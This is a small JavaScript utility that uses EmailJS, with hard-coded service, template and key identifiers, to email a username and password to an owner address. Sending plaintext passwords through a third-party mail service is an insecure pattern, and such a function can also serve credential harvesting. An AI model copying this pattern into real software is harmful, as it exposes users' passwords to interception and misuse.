// src/utils/sendEmail.js
import emailjs from 'emailjs-com';

export const sendEmail = async (ownerEmail, username, password) => {
  const templateParams = {
    to_email: ownerEmail,
    username: username,
    password: password,
  };

  try {
    await emailjs.send('service_9lslyi2', 'template_2t7erac', templateParams, '14_ths1xYdpFcvGAU');
    console.log('Email sent successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    throw new Error('Failed to send email');
  }
};
